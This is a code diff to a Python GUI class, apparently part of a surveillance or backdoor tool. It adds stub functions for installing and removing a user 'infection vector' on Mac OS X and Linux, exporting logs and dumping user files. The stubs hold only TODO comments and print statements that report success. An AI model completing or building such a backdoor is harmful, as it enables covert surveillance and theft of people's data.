@@ -1067,6 +1067,26 @@ class OfflineInstall(object):
 			self.builder.get_object("buttonbox3").set_sensitive(True)
 
 	#
+	# Install the infection vector on Mac OS X system with the backdoor of the user
+	##
+	def install_osx_backdoor(self, user):
+		#
+		# TODO: infettare l'user
+		##
+
+		print("    Install [OK] -> " + user + " on Mac OS X system...")
+
+	#
+	# Install the infection vector on Linux system with the backdoor of the user
+	##
+	def install_linux_backdoor(self, user):
+		#
+		# TODO: infettare l'user
+		##
+
+		print("    Install [OK] -> " + user + " on Linux system...")
+
+	#
 	# Install the infection vector with the backdoor of the user or users selected
 	##
 	def install(self, *args):
@@ -1077,15 +1097,40 @@ class OfflineInstall(object):
 		if len(rows) != 0:
 			for row in rows:
 				iter = model.get_iter(row)
+				user = model.get_value(iter, 1)
 
-				#
-				# TODO: Infetta l'user o users
-				##
-				print("  Selected: " + model.get_value(iter, 1))
+				print("  Selected: " + user)
+
+				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
+					self.install_osx_backdoor(user)
+				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
+					self.install_linux_backdoor(user)
+				else:
+					print("    Install [PASS] -> " + user + " on Unknown system.")
 
 			print("")
 			self.check_statususers()
 			self.select_os(None)
+
+	#
+	# Uninstall the infection vector on Mac OS X system with the backdoor of the user
+	##
+	def uninstall_osx_backdoor(self, user):
+		#
+		# TODO: disinfettare l'user
+		##
+
+		print("    Uninstall [OK] -> " + user + " on Mac OS X system...")
+
+	#
+	# Uninstall the infection vector on Linux system with the backdoor of the user
+	##
+	def uninstall_linux_backdoor(self, user):
+		#
+		# TODO: disinfettare l'user
+		##
+
+		print("    Uninstall [OK] -> " + user + " on Linux system...")
 
 	#
 	# Uninstall the infection vector with backdoor of the user or users selected
@@ -1098,15 +1143,40 @@ class OfflineInstall(object):
 		if len(rows) != 0:
 			for row in rows:
 				iter = model.get_iter(row)
+				user = model.get_value(iter, 1)
 
-				#
-				# TODO: Disinfetta l'user o users
-				##
-				print("  Selected: " + model.get_value(iter, 1))
+				print("  Selected: " + user)
+
+				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
+					self.uninstall_osx_backdoor(user)
+				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
+					self.uninstall_linux_backdoor(user)
+				else:
+					print("    Uninstall [PASS] -> " + user + " on Unknown system.")
 
 			print("")
 			self.check_statususers()
 			self.select_os(None)
+
+	#
+	# Export logs of the infection vector on Mac OS X system with backdoor of the user
+	##
+	def export_osx_log(self, user):
+		#
+		# TODO: esportare log dell'user
+		##
+
+		print("    Export log [OK] -> " + user + " on Mac OS X system...")
+
+	#
+	# Export logs of the infection vector on Linux system with backdoor of the user
+	##
+	def export_linux_log(self, user):
+		#
+		# TODO: esportare log dell'user
+		##
+
+		print("    Export log [OK] -> " + user + " on Linux system...")
 
 	#
 	# Export logs of the infection vector with backdoor of the user or users selected
@@ -1119,15 +1189,41 @@ class OfflineInstall(object):
 		if len(rows) != 0:
 			for row in rows:
 				iter = model.get_iter(row)
+				user = model.get_value(iter, 1)
 
-				#
-				# TODO: Esporta i log dell'user o users
-				##
-				print("  Selected: " + model.get_value(iter, 1))
+				print("  Selected: " + user)
+
+				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
+					self.export_osx_log(user)
+				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
+					self.export_linux_log(user)
+				else:
+					print("    Export log [PASS] -> " + user + " on Unknown system.")
 
 			print("")
 			self.check_statususers()
 			self.select_os(None)
+
+	#
+	# Dump files of the infection vector on Mac OS X system with backdoor of the user
+	##
+	def dump_osx_files(self, user):
+		#
+		# TODO: dump files dell'user
+		##
+
+		print("    Dump files [OK] -> " + user + " on Mac OS X system...")
+
+	#
+	# Dump files of the infection vector on Linux system with backdoor of the user
+	##
+	def dump_linux_files(self, user):
+		#
+		# TODO: dump files dell'user
+		##
+
+		print("    Dump files [OK] -> " + user + " on Linux system...")
+
 	#
 	# Dump files of the infection vector with backdoor of the user or users selected
 	##
@@ -1139,11 +1235,16 @@ class OfflineInstall(object):
 		if len(rows) != 0:
 			for row in rows:
 				iter = model.get_iter(row)
+				user = model.get_value(iter, 1)
 
-				#
-				# TODO: Dump dei files dell'user o users
-				##
-				print("  Selected: " + model.get_value(iter, 1))
+				print("  Selected: " + user)
+
+				if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
+					self.dump_osx_files(user)
+				elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
+					self.dump_linux_files(user)
+				else:
+					print("    Dump files [PASS] -> " + user + " on Unknown system.")
 
 			print("")
 			self.check_statususers()
